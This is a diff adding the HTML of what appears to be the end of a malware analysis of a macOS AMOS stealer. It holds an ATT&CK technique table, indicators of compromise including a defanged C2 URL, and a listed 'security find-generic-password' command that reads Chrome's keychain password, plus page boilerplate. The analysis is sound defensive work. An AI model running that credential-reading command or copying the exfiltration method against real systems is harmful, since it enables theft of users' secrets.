+          <td>The sample uses osascript to display the phishing prompt and the fake error dialog</td>
+      </tr>
+      <tr>
+          <td><strong>Execution</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1059/004/"  target="_blank" rel="noreferrer">T1059.004</a></td>
+          <td>Unix Shell</td>
+          <td>The sample executes bash -c to run security, dscl, and system_profiler</td>
+      </tr>
+      <tr>
+          <td><strong>Exfiltration</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1041/"  target="_blank" rel="noreferrer">T1041</a></td>
+          <td>Exfiltration Over C2 Channel</td>
+          <td>The ZIP archive is base64-encoded and sent via HTTP POST to amos-malware[.]ru/sendlog</td>
+      </tr>
+      <tr>
+          <td><strong>Exfiltration</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1132/001/"  target="_blank" rel="noreferrer">T1132.001</a></td>
+          <td>Standard Encoding</td>
+          <td>The archive is encoded with URL-safe Base64 before transmission</td>
+      </tr>
+      <tr>
+          <td><strong>Command and Control</strong></td>
+          <td><a href="https://attack.mitre.org/techniques/T1071/001/"  target="_blank" rel="noreferrer">T1071.001</a></td>
+          <td>Web Protocols</td>
+          <td>The sample communicates with the C2 server over HTTP using net/http PostForm</td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 class="relative group"><span class="hl">IoC</span>
+    <div id="ioc" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ioc" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Type</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>SHA-256</td>
+          <td>0dbe84f5c41709e83626385867abcd07a736d3191e39a8f9900882f351c275f1</td>
+      </tr>
+      <tr>
+          <td>MD5</td>
+          <td>c5367f04e9645033db6cda859c29bee7</td>
+      </tr>
+      <tr>
+          <td>Domain</td>
+          <td>amos-malware[.]ru</td>
+      </tr>
+      <tr>
+          <td>URL</td>
+          <td>http://amos-malware[.]ru/sendlog</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td>34.41.139.193</td>
+      </tr>
+      <tr>
+          <td>Request field</td>
+          <td>BuildID=UNICEF</td>
+      </tr>
+      <tr>
+          <td>Request field</td>
+          <td>user=Holocaust</td>
+      </tr>
+      <tr>
+          <td>Command</td>
+          <td>security 2&gt;&amp;1 &gt; /dev/null find-generic-password -ga &lsquo;Chrome&rsquo; | awk &lsquo;{print $2}&rsquo;</td>
+      </tr>
+      <tr>
+          <td>Command</td>
+          <td>system_profiler SPHardwareDataType</td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 class="relative group"><span class="hl">Used Tools</span>
+    <div id="used-tools" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#used-tools" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Tool</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>IDA</td>
+          <td>Static analysis and decompilation of the Mach-O binary</td>
+      </tr>
+      <tr>
+          <td>GoReSym</td>
+          <td>Recovery of Go symbols, type information and function names</td>
+      </tr>
+      <tr>
+          <td>XMachOViewer</td>
+          <td>Inspection of the Mach-O structure, architectures and sections</td>
+      </tr>
+      <tr>
+          <td>Burp Suite</td>
+          <td>Intercepting and replaying requests to the C2 endpoint</td>
+      </tr>
+      <tr>
+          <td>Python</td>
+          <td>Extracting the crypto extension ID list from the binary</td>
+      </tr>
+      <tr>
+          <td>Tor</td>
+          <td>Anonymized probing of the C2 server</td>
+      </tr>
+  </tbody>
+</table>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_investigations\MacOS-Amos\index.md"
+          data-oid-likes="likes_investigations\MacOS-Amos\index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
